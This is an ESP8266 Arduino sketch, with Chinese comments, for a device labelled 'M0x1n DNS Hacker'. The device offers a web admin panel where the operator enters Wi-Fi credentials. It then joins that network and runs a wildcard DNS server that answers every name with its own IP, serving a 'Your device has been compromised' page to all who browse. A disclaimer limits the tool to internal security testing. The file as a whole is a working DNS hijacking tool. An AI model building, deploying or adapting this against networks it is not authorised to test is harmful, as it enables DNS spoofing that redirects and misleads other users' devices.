#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>

// DNS劫持工具
// C语言中，可以用 #define 定义一个标识符来表示一个常量。其特点是：定义的标识符不占内存，只是一个临时的符号，预编译后这个符号就不存在了。
#ifndef STASSID
// 配网前AP的配置属性
#define STASSID "Moxin Tools"
#define STAPSK  "123456789" // 初始密码配置
#endif

/*************初始化**************/
// 将上面的常量赋值给常量ssid和password
const char* ssid = STASSID;
const char* password = STAPSK;
bool WiFistatus = 0; //初始化状态
const byte DNS_PORT = 53;
ESP8266WebServer server(80); // 设置Web服务端口
DNSServer dnsServer;
/*************初始化**************/


String indexs = "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\"content=\"width=device-width\"><title>DNS攻击管理-M0x1n Tools</title><style>body{background:#f06d06}header,nav{text-align:center;background:#f06d06;margin:20px 0;padding:10px}nav a{text-decoration:none;background:#333;border-radius:5px;color:#f06d06;padding:3px 8px}</style></head><body><header><h1>M0x1n DNS Hacker</h1><h3>DNS黑客</h3></header><nav role='navigation'><a href=\"/admin/attack\">攻击</a><a href=\"/admin/config\">配网</a><a href=\"/about\">关于</a><p>这款工具支持ESP8622的部分型号，因为没有经济实力进行测试，很抱歉。<br>❤M0x1n❤<br>没啥脑洞去写HTML暂且就这样<br>Var:αβγδεζηθ</p></nav></body></html>";
// 被劫持页面
String configs ="<!DOCTYPE html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\"content=\"width=device-width\"><title>网络配置选项-M0x1n Tools</title><style>body{background:#f06d06}header,nav{text-align:center;background:#f06d06;margin:20px 0;padding:10px}nav a{text-decoration:none;background:#333;border-radius:5px;color:#f06d06;padding:3px 8px}</style></head><a href=\"./\">返回上层</a><body><header><h1>M0x1n DNS Hacker</h1><h3>劫持工具配置</h3></header><nav role='navigation'><form name=\"my\"><input type=\"text\"name=\"s\"placeholder=\"请输入SSID\"id=\"aa\"><br><input type=\"text\"name=\"p\"placeholder=\"请输入密码\"id=\"bb\"><br><br><input type=\"button\"value=\"提交\"onclick=\"wifi()\"></form><script language=\"javascript\">function wifi(){var ssid=my.s.value;var password=bb.value;var xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\",\"config/configs?ssid=\"+ssid+\"&password=\"+password,1);xmlhttp.send();alert(\"您的WiFi为：\"+ssid+' '+\"密码为：\"+password+\"，当您看到指示灯长亮三秒则是连接成功。 PS：连续闪灯表明正在连接！\")}</script><p><br><br>br>Var:αβγδεζηθ</p></nav></body></html>";
String aboutp = "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\"content=\"width=device-width\"><title>About The Tools-M0x1n Tools</title><style>body{background:#f06d06}header,nav{text-align:center;background:#f06d06;margin:20px 0;padding:10px}nav a{text-decoration:none;background:#333;border-radius:5px;color:#f06d06;padding:3px 8px}</style></head><body><header><h1>M0x1n DNS Hacker</h1><h3>关于这个工具</h3></header><nav role='navigation'><br><p>此工具仅用于内网安全测试<br>❤M0x1n❤<br><br>--=请勿用于非法=--<br>--QQ:1044631097--<br>Var:αβγδεζηθ</p></nav></body></html>";
String dnsps = "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\"content=\"width=device-width\"><title>DNS ERROR-M0x1n Tools</title><style>body{background:#f06d06}header,nav{text-align:center;background:#f06d06;margin:20px 0;padding:10px}nav a{text-decoration:none;background:#333;border-radius:5px;color:#f06d06;padding:3px 8px}</style></head><body><header><h1>M0x1n DNS Hacker</h1><h3>DNS黑客Tools</h3></header><nav role='navigation'><br><p>Your device has been compromised<br>❤M0x1n❤<br><br>Var:αβγδεζηθ</p></nav></body></html>";


void putcode(String code){
  // 输出需要的代码
  server.send(200, "text/html",code);
}

void dnsp(){ 
  putcode(dnsps); //因为是两个服务 所以不能用这个语句
  digitalWrite(LED_BUILTIN, LOW); // 给爷亮
  delay(100);
  digitalWrite(LED_BUILTIN, HIGH); // 给爷灭 
}

void pindex(){
  //server.send(200, "text/html", indexs); // 生成HTML页面 
  putcode(indexs);
  // 应该是有人访问了才会执行
  digitalWrite(LED_BUILTIN, LOW); // 给爷亮
  delay(100);
  digitalWrite(LED_BUILTIN, HIGH); // 给爷灭 
}
/*****************************************************
 * 函数名称：autoConfig()
 * 函数说明：自动连接WiFi函数
 * 参数说明：无
 * 返回值说明:1：连接成功 0：连接失败

bool autoConfig()
{
  WiFi.mode(WIFI_STA);
  WiFi.begin();
  Serial.print("AutoConfig Waiting......");
  for (int i = 0; i < 20; i++)
  {
    if (WiFi.status() == WL_CONNECTED)
    {
      Serial.println("AutoConfig Success");
      Serial.printf("SSID:%s\r\n", WiFi.SSID().c_str());
      Serial.printf("PSW:%s\r\n", WiFi.psk().c_str());
      WiFi.printDiag(Serial);
      return 1;
      //break;
    }
    else
    {
      Serial.print(".");
      LED_Flag = !LED_Flag;
      if(LED_Flag)
      // 同上 High 为高电平 Low 为低电平
          digitalWrite(LED_BUILTIN, HIGH);
      else
          digitalWrite(LED_BUILTIN, LOW); 
      delay(500);
    }
  }
  Serial.println("AutoConfig Faild!" );
  return 0;
  //WiFi.printDiag(Serial);
}
******************************************************/
void requestget(){
    String wifis = server.arg("ssid"); //从JavaScript发送的数据中找ssid的值
    String wifip = server.arg("password"); //从JavaScript发送的数据中找password的值
    Serial.println(wifis); Serial.println(wifip);
    digitalWrite(LED_BUILTIN, LOW); // 给爷亮
    delay(80);
    digitalWrite(LED_BUILTIN, HIGH); // 给爷灭 
    delay(80);
    digitalWrite(LED_BUILTIN, LOW); // 给爷亮
    delay(80);
    digitalWrite(LED_BUILTIN, HIGH); // 给爷灭 
    delay(80);
    WiFi.mode(WIFI_STA);//设置模式为STA
    digitalWrite(LED_BUILTIN, LOW);
    Serial.println("STA设置完成"); //设置wifi为STA模式 AP将会被关闭
    WiFi.begin(wifis,wifip);
    //加载应该被循环判断
      // 应该是有人访问了才会执行
    while (WiFi.status() != WL_CONNECTED) //如果未连接完成（成功解决之前的问题） 也就是
    {
      digitalWrite(LED_BUILTIN, LOW); // 给爷亮
      delay(100);
      digitalWrite(LED_BUILTIN, HIGH); // 给爷灭 
      delay(100);
    }
    if (WiFi.status() == WL_CONNECTED)
    {
      digitalWrite(LED_BUILTIN, LOW); // 给爷亮
      delay(3000); // 亮三秒表示连接成功
      digitalWrite(LED_BUILTIN, HIGH);
      WiFistatus = 1; // [连接成功] 在Setup中声明
      //直接发起攻击
      
      // LED提醒--start
      dnsServer.start(DNS_PORT,"*",WiFi.localIP());
      digitalWrite(LED_BUILTIN, HIGH);
      delay(200);
      digitalWrite(LED_BUILTIN, LOW);
      delay(200);
      digitalWrite(LED_BUILTIN, HIGH);
      delay(200);
      digitalWrite(LED_BUILTIN, LOW);
      // LED提醒--end
      IPAddress myIP = WiFi.softAPIP();
      Serial.print("AP IP address: ");
      Serial.println(myIP);    
      if (MDNS.begin("esp8266")) {
        Serial.println("MDNS responder started");
      }
      server.on("/", dnsp); // 80页面
      server.onNotFound(dnsp);//请求失败回调函数    
      server.begin();//开启服务器
      Serial.println("HTTP server started");
      while(1)
    {
        server.handleClient();
        MDNS.update();  
        if (WiFi.status() == WL_CONNECTED)
        {
            Serial.println("HtmlConfig Success");
            Serial.printf("SSID:%s\r\n", WiFi.SSID().c_str());
            Serial.printf("PSW:%s\r\n", WiFi.psk().c_str());
            Serial.println("HTML连接成功");
            break;
        }
    }  
      
      Serial.println(WiFi.localIP());
    }   
}

void aboutss(){
  //server.send(200, "text/html", indexs); // 生成HTML页面 
  putcode(aboutp);
  // 应该是有人访问了才会执行
  digitalWrite(LED_BUILTIN, LOW); // 给爷亮
  delay(100);
  digitalWrite(LED_BUILTIN, HIGH); // 给爷灭 
}

void cindex(){
  //server.send(200, "text/html", indexs); // 生成HTML页面 
  putcode(configs);
  // 应该是有人访问了才会执行
  digitalWrite(LED_BUILTIN, LOW); // 给爷亮
  delay(100);
  digitalWrite(LED_BUILTIN, HIGH); // 给爷灭 
}

/*防止冲突 暂且去掉此处
 * 
 *void errorGet(){
 *String aurl="/admin";
 *putcode("<script language=\"javascript\">window.navigate(\""+ aurl +"\");</script>");
  // 应该是有人访问了才会执行
 *digitalWrite(LED_BUILTIN, LOW); // 给爷亮
 *delay(100);
 *digitalWrite(LED_BUILTIN, HIGH); // 给爷灭 
}*/

void NotFound() {
  digitalWrite(LED_BUILTIN, 0);
  String message = "File Not Found\n\n";
  message += "URI: ";
  message += server.uri();
  message += "\nMethod: ";
  message += (server.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server.args();
  message += "\n";
  for (uint8_t i = 0; i < server.args(); i++) {
    message += " " + server.argName(i) + ": " + server.arg(i) + "\n";
  }
  server.send(404, "text/plain", message);
  // 设置LED_Builtin为高电平
  digitalWrite(LED_BUILTIN, 1);
}

// 下面是服务页面的配置
void htmlConfig()
{
    WiFi.mode(WIFI_AP);//设置模式为AP+
    digitalWrite(LED_BUILTIN, LOW);
    // 创建AP
    WiFi.softAP(ssid, password);
    Serial.println("AP设置完成");
    // LED提醒--start
    digitalWrite(LED_BUILTIN, HIGH);
    delay(200);
    digitalWrite(LED_BUILTIN, LOW);
    delay(200);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(200);
    digitalWrite(LED_BUILTIN, LOW);
    // LED提醒--end
    IPAddress myIP = WiFi.softAPIP();
    Serial.print("AP IP address: ");
    Serial.println(myIP);
  
    if (MDNS.begin("esp8266")) {
      Serial.println("MDNS responder started");
    }
    server.on("/", dnsp); // 80页面
    // server.on("/",errorGet); 因为会冲突 所以就注释掉了错误页面跳转
    server.on("/admin", pindex);
    server.on("/admin/", pindex);
    server.on("/about", aboutss);
    server.on("/about/", aboutss);
    server.on("/admin/config/configs", HTTP_GET, requestget);// 取回信息
    server.on("/admin/config/configs/", HTTP_GET, requestget);// 取回信息
    server.on("/admin/config/", cindex); // 配置配网页面
    server.on("/admin/config", cindex); // 配置配网页面
    server.onNotFound(NotFound);//请求失败回调函数    
    server.begin();//开启服务器
    Serial.println("HTTP server started");
    while(1)
    {
        server.handleClient();
        MDNS.update();  
        if (WiFi.status() == WL_CONNECTED)
        {
            Serial.println("HtmlConfig Success");
            Serial.printf("SSID:%s\r\n", WiFi.SSID().c_str());
            Serial.printf("PSW:%s\r\n", WiFi.psk().c_str());
            Serial.println("HTML连接成功");
            break;
        }
    }  
}

void setup() {
  // 通电最先执行且只执行一次
  pinMode(LED_BUILTIN, OUTPUT); // 先给LED_BUILTIN递一包烟 
  Serial.begin(115200);
  htmlConfig();
  digitalWrite(LED_BUILTIN, LOW);  // 抓鸭子 - 抓几只
  delay(2000); // 2000只 
  digitalWrite(LED_BUILTIN, HIGH); // 别让他累着
  delay(500);
  digitalWrite(LED_BUILTIN, LOW);  // 抓鸭子 - 抓几只
  delay(1000); // 1000只 
  digitalWrite(LED_BUILTIN, HIGH); // 别让他累着
  
}

void loop() {
  // put your main code here, to run repeatedly:
    if(WiFistatus == 1) // 当检测是已经配置完毕时，则创建一个保险标识
    {
       dnsServer.processNextRequest();
       // 完成配置状态灯
       // 每5秒检测一次连接状态
       if (WiFi.status() != WL_CONNECTED)// 如果在配置连接完毕后又断开，则取消配置且提醒。
       {
         digitalWrite(LED_BUILTIN, LOW); // 给爷亮
         delay(5000); // 亮五秒表示掉线
         digitalWrite(LED_BUILTIN, HIGH);
         WiFistatus = 0; // [掉线] 
         Serial.println(WiFi.localIP());
       }   
    }
    else{
       digitalWrite(LED_BUILTIN, HIGH);
       delay(500);
       digitalWrite(LED_BUILTIN, LOW);
       //也就是未声明时状态
       delay(500);
       digitalWrite(LED_BUILTIN, HIGH);
    }
}
